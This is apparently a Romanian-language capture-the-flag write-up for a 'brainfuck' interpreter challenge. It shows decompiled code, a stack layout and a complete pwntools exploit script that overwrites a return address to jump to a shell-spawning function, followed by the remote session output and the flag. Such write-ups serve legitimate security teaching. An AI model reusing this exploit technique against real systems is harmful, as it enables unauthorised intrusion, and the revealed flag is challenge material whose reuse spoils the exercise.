In IDA, am vazut ca putem citi 1024 de caractere intr-un buffer de 1028 de octeti.
Acest buffer ar este, mai tarziu, interpretat intr-o functie care arata cam asa:

```c
int __cdecl do_smth_with_bf_code(int code, int len)
{
  int result; // eax
  _BYTE v3[1024]; // [esp+8h] [ebp-410h]
  int i; // [esp+408h] [ebp-10h]
  int v5; // [esp+40Ch] [ebp-Ch]

  v5 = 512;
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= len )
      break;
    switch ( *(_BYTE *)(i + code) )
    {
      case ',':
        v3[v5] = getchar();
        break;
      case '.':
        putchar((char)v3[v5]);
        break;
      case '<':
        --v5;
        break;
      case '>':
        ++v5;
        break;
      case '[':
      case ']':
        puts("Instruction not implemented");
        goto LABEL_8;
      default:
LABEL_8:
        puts("Invalid instruction");
        break;
    }
  }
  return result;
}
```

Programul incepe cu un index egal cu 512 si ne lasa sa il incrementam/decrementam oricat de mult am vrea noi.

Evident, asta ne da posibilitatea sa suprascriem adresa de return si sa facem programul sa execute o functie neapelata, care ne deschide un shell.

```c
int sub_804856B()
{
  return off_804A030(command);
}
```

In caz ca nu ar fi existat aceasta functie, am fi putut injecta noi un shellcode, insa:

```bash
Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
```

Asa ca tot ce trebuie sa facem este sa ne ducem indexul inainte de adresa de retur.
IDA ajuta si in acest fel, oferindu-ne un overview al stack-ului functiei care interpreteaza:

```bash
-0000000000000410     _BYTE buffer[1024];
-0000000000000010     _DWORD var_10;
-000000000000000C     _DWORD index;
-0000000000000008     // padding byte
-0000000000000007     // padding byte
-0000000000000006     // padding byte
-0000000000000005     // padding byte
-0000000000000004     // padding byte
-0000000000000003     // padding byte
-0000000000000002     // padding byte
-0000000000000001     // padding byte
+0000000000000000     _DWORD __saved_registers;
+0000000000000004     _UNKNOWN *__return_address;
+0000000000000008     _DWORD code;
+000000000000000C     _DWORD len;
```

Trebuie doar sa mai fim atenti la un lucru:
In functia care interpreaza codul de brainfuck, `,` nu incrementeaza indexul, deci `,,,,` nu ar face decat sa suprascrie acelasi octet, deci pentru a suprascrie adresa de retur trebuie sa suprasciem ce se afla in memorie la `stack[index]` si sa incrementam `index`: `,>`.

```py
from pwn import *

BINARY = './brainfuck'
HOST = "141.85.224.104"
PORT = 6666

context.binary = ELF(BINARY)
context.terminal = ['tmux', 'splitw', '-h']

# p = remote(HOST, PORT)
p = process(BINARY)

brainfuck = ">" * 532 # point to return address
brainfuck += ",>" * 4 # overwrite return address

assert len(brainfuck) < 1024

payload = p32(0x0804856b)

# gdb.attach(p)

p.recvuntil("code:\n")
sleep(1)

p.sendline(brainfuck.encode())

log.info("bf_code length: %d" % len(brainfuck))
log.info("payload: %s" % payload)

p.send(payload)

p.interactive()
```

```bash
[+] Opening connection to 141.85.224.104 on port 6666: Done
/home/cybi/CTF/brainfuck/exploit.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("code:\n")
[*] bf_code length: 540
[*] payload: b'k\x85\x04\x08'
[*] Switching to interactive mode
$ cat /home/ctf/flag
SSS{st0p_fuck!ng_w!th_my_br@!n}
```